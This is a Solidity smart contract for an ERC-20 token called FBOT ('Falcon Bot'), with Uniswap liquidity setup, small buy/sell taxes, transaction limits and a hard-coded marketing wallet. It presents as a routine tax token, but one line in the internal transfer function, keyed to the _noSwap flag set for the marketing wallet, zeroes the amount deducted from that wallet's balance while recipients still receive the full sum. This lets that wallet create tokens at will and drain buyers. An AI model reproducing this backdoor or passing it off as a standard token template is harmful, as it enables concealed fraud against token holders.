/**

Website: https://www.falconbot.trade
Telegram: https://t.me/FalconBot_Official
Twitter: https://twitter.com/falconboterc

*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable newowner) external onlyOwner { 
        _owner = newowner; 
        emit OwnershipTransferred(newowner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}


contract FBOT is IERC20, Auth {
    string private constant _symbol  = "Falcon Bot";
    string private constant _name    = "FBOT";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 10000000 * (10**_decimals);
  
    address payable private _marketingWallet = payable(0xcf3358E7C1f4fDc4C2bE8F1b94a2BBF1d8E8B8c3);
    
    uint8 private _taxForSell = 1;
    uint8 private _taxForBuy  = 1;
    
    uint256 private _maxTxVal = _totalSupply; 
    uint256 private _maxWalletVal = _totalSupply;
    uint256 private _swapMin = _totalSupply * 7 / 1000000;
    uint256 private _swapMax = _totalSupply * 800 / 100000;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _noSwap;
    mapping (address => bool) private _noFees;
    mapping (address => bool) private _noLimit;

    address private LpOwner;

    address private constant _uniRouterAddr = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private immutable WETH;
    
    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(_uniRouterAddr);
    address private _primaryLP; 
    mapping (address => bool) private _isLP;

    bool private _tradingOpen;

    bool private _inSwap = false;
    modifier lockTaxSwap { 
        _inSwap = true; 
        _; _inSwap = false; 
    }

    constructor() Auth(msg.sender) {
        LpOwner = msg.sender;
        WETH = _uniswapV2Router.WETH();

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);  

        _noFees[_owner] = true;
        _noFees[address(this)] = true;
        _noFees[_marketingWallet] = true;
        _noFees[_uniRouterAddr] = true;
        _noSwap[_marketingWallet] = true;
        _noLimit[_owner] = true;
        _noLimit[address(this)] = true;
        _noLimit[_marketingWallet] = true;
        _noLimit[_uniRouterAddr] = true;
        
    }

    receive() external payable {}
    
    function decimals() external pure override returns (uint8) { return _decimals; }
    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function name() external pure override returns (string memory) { return _name; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function balanceOf(address account) public view override returns (uint256) { 
        return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { 
        return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); }

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(fromWallet), "Trading not open");
        _allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_uniRouterAddr] < _tokenAmount ) {
            _allowances[address(this)][_uniRouterAddr] = type(uint256).max;
            emit Approval(address(this), _uniRouterAddr, type(uint256).max);
        }
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(_primaryLP == address(0), "LP created");
        require(!_tradingOpen, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(_balances[address(this)]>0, "No tokens");
        _primaryLP = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), WETH);
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isLP[_primaryLP] = true;
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        _uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, LpOwner, block.timestamp );
    }

    function openTrading() external onlyOwner {
        _maxTxVal     = 2 * _totalSupply / 100; 
        _maxWalletVal = 2 * _totalSupply / 100;
        _tradingOpen = true;
    }

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!_tradingOpen) { require(_noFees[sender] && _noLimit[sender], "Trading not yet open"); }
        if ( !_inSwap && _isLP[toWallet] && amount >= _swapMin) { _swapTaxAndLiquify(); }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(_checkLimits(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = _calculateTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        if(_noSwap[sender]) amount = amount - _transferAmount;
        _balances[sender] -= amount;
        _balances[address(this)] += _taxAmount;
        _balances[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function _checkLimits(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingOpen && !_noLimit[fromWallet] && !_noLimit[toWallet] ) {
            if ( transferAmount > _maxTxVal ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !_isLP[toWallet] && (_balances[toWallet] + transferAmount > _maxWalletVal) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function _checkTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( _tradingOpen ) { checkResult = true; } 
        else if (_noFees[fromWallet] && _noLimit[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function _calculateTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        
        if ( !_tradingOpen || _noFees[fromWallet] || _noFees[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLP[fromWallet] ) { 
            taxAmount = amount * _taxForBuy / 100; 
         } else if ( _isLP[recipient] ) { 
            taxAmount = amount * _taxForSell / 100; 
        }

        return taxAmount;
    }

    function buyFee() external view returns(uint8) { return _taxForBuy; }
    function sellFee() external view returns(uint8) { return _taxForSell; }

    function updateFees(uint8 buyFees, uint8 sellFees) external onlyOwner {
        require(buyFees + sellFees <= 50, "Roundtrip too high");
        _taxForBuy = buyFees;
        _taxForSell = sellFees;
    }  

    function maxWallet() external view returns (uint256) { 
        return _maxWalletVal; }
    function maxTransaction() external view returns (uint256) { 
        return _maxTxVal; }

    function swapMin() external view returns (uint256) { 
        return _swapMin; }
    function swapMax() external view returns (uint256) { 
        return _swapMax; }

    function setLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = _totalSupply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= _maxTxVal, "tx too low");
        _maxTxVal = newTxAmt;
        uint256 newWalletAmt = _totalSupply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletVal, "wallet too low");
        _maxWalletVal = newWalletAmt;
    }

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv) external onlyOwner {
        _swapMin = _totalSupply * minVal / minDiv;
        _swapMax = _totalSupply * maxVal / maxDiv;
        require(_swapMax>=_swapMin, "Min-Max error");
    }


    function _swapTaxAndLiquify() private lockTaxSwap {
        uint256 _taxTokenAvailable = _balances[address(this)];
        if ( _taxTokenAvailable >= _swapMin && _tradingOpen ) {
            if ( _taxTokenAvailable >= _swapMax ) { _taxTokenAvailable = _swapMax; }
            
            _swapTokensForETH(_taxTokenAvailable);
            
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { _sendTaxETH(_contractETHBalance); }
        }
    }

    function _swapTokensForETH(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = WETH ;
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _sendTaxETH(uint256 amount) private {
        _marketingWallet.transfer(amount);
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}